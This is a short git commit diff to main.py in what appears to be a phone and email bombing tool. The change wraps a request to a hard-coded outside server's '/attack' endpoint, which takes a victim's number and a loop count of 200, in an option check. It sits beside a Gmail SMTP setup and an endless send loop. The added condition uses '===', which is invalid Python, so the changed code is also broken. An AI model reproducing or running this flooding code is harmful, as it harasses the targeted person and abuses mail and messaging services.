59febdf39911fabe9126eaeacefecee6addbf52b
Kiny-Kiny <70079144+Kiny-Kiny@users.noreply.github.com>
2021-08-04 12:18:24 -0300

    Update main.py

--- main.py
+++ main.py
@@ -76,7 +76,8 @@ def init():
 	'server':'smtp.gmail.com',
 	}
 	try:
-		   	requests.get(f'http://144.217.235.227:3000/attack?number={numero}&loops=200')
+		   	if op == 1 or op == 4 or op === 5:
+		   		requests.get(f'http://144.217.235.227:3000/attack?number={numero}&loops=200')
 		   	while True:
 		   		##############################
 	   			msg = email.message.Message()
